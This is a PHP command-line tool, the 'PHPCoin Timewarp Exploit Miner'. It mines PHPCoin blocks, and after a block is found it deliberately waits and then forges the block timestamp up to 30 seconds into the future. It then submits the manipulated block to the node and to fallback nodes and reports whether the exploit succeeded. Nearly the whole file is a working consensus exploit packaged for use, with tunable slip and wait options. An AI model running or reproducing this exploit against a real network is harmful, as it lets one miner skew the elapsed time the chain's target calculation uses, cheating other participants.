<?php
if(php_sapi_name() !== 'cli') exit;
const DEFAULT_CHAIN_ID = "01";
const MINER_VERSION = "1.5";
if(Phar::running()) {
	require_once 'vendor/autoload.php';
} else {
	require_once dirname(__DIR__).'/vendor/autoload.php';
}

class TimewarpMiner extends Miner
{
    private $running = true;
    private $hashing_time = 0;
    private $hashing_cnt = 0;
    private $speed;
    private $sleep_time;
    private $attempt;
    private $forked;
    public $slipTime = 20; // Default slip time in seconds
    public $waitTime = 20; // Default wait time in seconds

    function measureSpeed($t1, $th) {
        $t2 = microtime(true);
        $this->hashing_cnt++;
        $this->hashing_time = $this->hashing_time + ($t2-$th);

        $diff = $t2 - $t1;
        $this->speed = round($this->attempt / $diff,2);

        $calc_cnt = round($this->speed * 60);

        if($calc_cnt > 0 && $this->hashing_cnt % $calc_cnt == 0) {
            $this->sleep_time = $this->cpu == 0 ? INF : round((($this->hashing_time/$this->hashing_cnt)*1000)*(100-$this->cpu)/$this->cpu);
            if($this->sleep_time < 0) {
                $this->sleep_time = 0;
            }
        }
    }

    public function start()
    {
        global $argv;
        $this->miningStat = [
            'started' => time(),
            'hashes' => 0,
            'submits' => 0,
            'accepted' => 0,
            'rejected' => 0,
            'dropped' => 0,
        ];
        $start_time = time();
        $prev_hashes = null;
        $this->sleep_time = (100 - $this->cpu) * 5;

        $this->getMiningNodes();

        while ($this->running) {
            $this->cnt++;

            $info = $this->getMiningInfo();
            if ($info === false) {
                _log("Can not get mining info", 0);
                sleep(3);
                continue;
            }

            if (!isset($info['data']['generator'])) {
                _log("Miner node does not send generator address");
                sleep(3);
                continue;
            }

            if (!isset($info['data']['ip'])) {
                _log("Miner node does not send ip address ", json_encode($info));
                sleep(3);
                continue;
            }

            $ip = $info['data']['ip'];
            if (!Peer::validateIp($ip)) {
                _log("Miner does not have valid ip address: $ip");
                sleep(3);
                continue;
            }

            $height = $info['data']['height'] + 1;
            $block_date = $info['data']['date'];
            $difficulty = $info['data']['difficulty'];
            $reward = $info['data']['reward'];
            $data = [];
            $nodeTime = $info['data']['time'];
            $prev_block_id = $info['data']['block'];
            $chain_id = $info['data']['chain_id'];
            $blockFound = false;


            $now = time();
            $offset = $nodeTime - $now;

            $this->attempt = 0;

            $bl = new Block(null, $this->address, $height, null, null, $data, $difficulty, Block::versionCode($height), null, $prev_block_id);

            $t1 = microtime(true);
            $prev_elapsed = null;
            while (!$blockFound) {
                $this->attempt++;
                if ($this->sleep_time == INF) {
                    $this->running = false;
                    break;
                }
                usleep($this->sleep_time * 1000);

                $now = time();
                $elapsed = $now - $offset - $block_date;
                $new_block_date = $block_date + $elapsed;
                _log("Time=now=$now nodeTime=$nodeTime offset=$offset elapsed=$elapsed", 4);
                $th = microtime(true);
                $bl->argon = $bl->calculateArgonHash($block_date, $elapsed);
                $bl->nonce = $bl->calculateNonce($block_date, $elapsed, $chain_id);
                $bl->date = $block_date;
                $hit = $bl->calculateHit();
                $target = $bl->calculateTarget($elapsed);
                $blockFound = ($hit > 0 && $target > 0 && $hit > $target);

                $this->measureSpeed($t1, $th);

                $s = "PID=" . getmypid() . " Mining attempt={$this->attempt} height=$height difficulty=$difficulty elapsed=$elapsed hit=$hit target=$target speed={$this->speed} submits=" .
                    $this->miningStat['submits'] . " accepted=" . $this->miningStat['accepted'] . " rejected=" . $this->miningStat['rejected'] . " dropped=" . $this->miningStat['dropped'];
                if (!$this->forked && !in_array("--flat-log", $argv)) {
                    echo "$s \r";
                } else {
                    echo $s . PHP_EOL;
                }
                $this->miningStat['hashes']++;
                if ($prev_elapsed != $elapsed && $elapsed % 10 == 0) {
                    $prev_elapsed = $elapsed;
                    $info = $this->getMiningInfo();
                    if ($info !== false) {
                        _log("Checking new block from server " . $info['data']['block'] . " with our block $prev_block_id", 4);
                        if ($info['data']['block'] != $prev_block_id) {
                            _log("New block received", 2);
                            $this->miningStat['dropped']++;
                            break;
                        }
                    }
                }
                $send_interval = 60;
                $t = time();
                $elapsed_send = $t - $start_time;
                if ($elapsed_send >= $send_interval) {
                    $start_time = time();
                    $hashes = $this->miningStat['hashes'] - $prev_hashes;
                    $prev_hashes = $this->miningStat['hashes'];
                    $this->sendStat($hashes, $height, $send_interval);
                }
            }

            if (!$blockFound || $elapsed <= 0) {
                continue;
            }

            // --- Timewarp Exploit Start ---
            $slipTime = min(30, $this->slipTime); // Ensure slip time doesn't exceed 30 seconds
            echo PHP_EOL . "[+] Block found with a valid hit: $hit" . PHP_EOL;
            echo "[+] Starting Timewarp attack. Waiting {$this->waitTime} seconds to artificially inflate elapsed time..." . PHP_EOL;
            sleep($this->waitTime);
            echo "[+] Waited {$this->waitTime} seconds. Now manipulating timestamp..." . PHP_EOL;

            $new_block_date = time() + $slipTime;
            $original_elapsed = $elapsed;
            $elapsed = $new_block_date - $block_date;

            echo "[+] Original elapsed time: $original_elapsed" . PHP_EOL;
            echo "[+] Manipulated elapsed time: $elapsed" . PHP_EOL;
            echo "[+] Original block date: " . date("r", $block_date + $original_elapsed) . PHP_EOL;
            echo "[+] Manipulated block date: " . date("r", $new_block_date) . PHP_EOL;
            // --- Timewarp Exploit End ---

            $postData = [
                'argon' => $bl->argon,
                'nonce' => $bl->nonce,
                'height' => $height,
                'difficulty' => $difficulty,
                'address' => $this->address,
                'hit' => (string)$hit,
                'target' => (string)$target,
                'date' => $new_block_date,
                'elapsed' => $elapsed,
                'minerInfo' => 'phpcoin-miner cli ' . VERSION,
                "version" => MINER_VERSION
            ];

            $this->miningStat['submits']++;
            $res = $this->sendHash($this->node, $postData, $response);
            $accepted = false;
            if ($res) {
                $accepted = true;
            } else {
                if (is_array($this->miningNodes) && count($this->miningNodes) > 0) {
                    foreach ($this->miningNodes as $node) {
                        $res = $this->sendHash($node, $postData, $response);
                        if ($res) {
                            $accepted = true;
                            break;
                        }
                    }
                }
            }

            if ($accepted) {
                _log("Block confirmed", 1);
                $this->miningStat['accepted']++;
                echo "[+] Exploit successful! The manipulated block was accepted by the node." . PHP_EOL;
            } else {
                _log("Block not confirmed: " . $res, 1);
                $this->miningStat['rejected']++;
                 echo "[-] Exploit failed. The manipulated block was rejected by the node." . PHP_EOL;
            }

            sleep(3);

            if ($this->block_cnt > 0 && $this->cnt >= $this->block_cnt) {
                break;
            }

            _log("Mining stats: " . json_encode($this->miningStat), 2);
            $minerStatFile = Miner::getStatFile();
            file_put_contents($minerStatFile, json_encode($this->miningStat));
        }

        _log("Miner stopped");
    }
}


$node = @$argv[1];
$address = @$argv[2];
$cpu = @$argv[3];
$block_cnt = @$argv[4];

foreach ($argv as $item){
    if(strpos($item, "--threads")!==false) {
        $arr = explode("=", $item);
        $threads = $arr[1];
    }
    if(strpos($item, "--slip-time")!==false) {
        $arr = explode("=", $item);
        $slipTime = $arr[1];
    }
    if(strpos($item, "--wait-time")!==false) {
        $arr = explode("=", $item);
        $waitTime = $arr[1];
    }
}

if (in_array('help', $argv) || in_array('--help', $argv)) {
    echo "PHPCoin Timewarp Exploit Miner (Version ".MINER_VERSION.")".PHP_EOL;
    echo "Usage: php utils/miner.timewarp.php <node> <address> <cpu> [options]".PHP_EOL;
    echo PHP_EOL;
    echo "Arguments:".PHP_EOL;
    echo "  <node>          The URL of the node (e.g., http://127.0.0.1)".PHP_EOL;
    echo "  <address>       The mining address".PHP_EOL;
    echo "  <cpu>           The percentage of CPU to use (0-100)".PHP_EOL;
    echo PHP_EOL;
    echo "Options:".PHP_EOL;
    echo "  --threads=<num> Number of threads to use for mining (default: 1)".PHP_EOL;
    echo "  --slip-time=<sec> The number of seconds to slip the timestamp into the future (default: 20, max: 30)".PHP_EOL;
    echo "  --wait-time=<sec> The number of seconds to wait after finding a block before submitting (default: 20)".PHP_EOL;
    echo "  --help          Display this help message".PHP_EOL;
    exit;
}


if(file_exists(getcwd()."/miner.conf")) {
	$minerConf = parse_ini_file(getcwd()."/miner.conf");
	$node = $minerConf['node'];
	$address = $minerConf['address'];
	$block_cnt = @$minerConf['block_cnt'];
	$cpu = @$minerConf['cpu'];
    $threads = @$minerConf['threads'];
}

if(empty($threads)) {
    $threads=1;
}

$cpu = is_null($cpu) ? 50 : $cpu;
if($cpu > 100) $cpu = 100;

echo "PHPCoin Miner Version ".MINER_VERSION.PHP_EOL;
echo "Mining server:  ".$node.PHP_EOL;
echo "Mining address: ".$address.PHP_EOL;
echo "CPU:            ".$cpu.PHP_EOL;
echo "Threads:        ".$threads.PHP_EOL;


if(empty($node) && empty($address)) {
	die("Usage: miner <node> <address> <cpu>".PHP_EOL);
}

if(empty($node)) {
	die("Node not defined".PHP_EOL);
}
if(empty($address)) {
	die("Address not defined".PHP_EOL);
}

$res = url_get($node . "/api.php?q=getPublicKey&address=".$address);
if(empty($res)) {
	die("No response from node".PHP_EOL);
}
$res = json_decode($res, true);
if(empty($res)) {
	die("Invalid response from node".PHP_EOL);
}
if(!($res['status']=="ok" && !empty($res['data']))) {
	die("Invalid response from node: ".json_encode($res).PHP_EOL);
}

echo "Network:        ".$res['network'].PHP_EOL;

$_config['enable_logging'] = true;
$_config['log_verbosity']=0;
$_config['log_file']="/dev/null";
$_config['chain_id'] = trim(file_exists(dirname(__DIR__)."/chain_id"));

define("ROOT", __DIR__);

function startMiner($address,$node, $forked) {
    global $cpu, $block_cnt, $slipTime, $waitTime;
    $miner = new TimewarpMiner($address, $node, $forked);
    if (!empty($slipTime)) {
        $miner->slipTime = $slipTime;
    }
    if (!empty($waitTime)) {
        $miner->waitTime = $waitTime;
    }
    $miner->block_cnt = empty($block_cnt) ? 0 : $block_cnt;
    $miner->cpu = $cpu;
    $miner->start();
}

if($threads == 1) {
    startMiner($address,$node, false);
} else {
    $forker = new Forker();
    for($i=1; $i<=$threads; $i++) {
        $forker->fork(function() use ($address,$node) {
            startMiner($address,$node, true);
        });
    }
    $forker->exec();
}
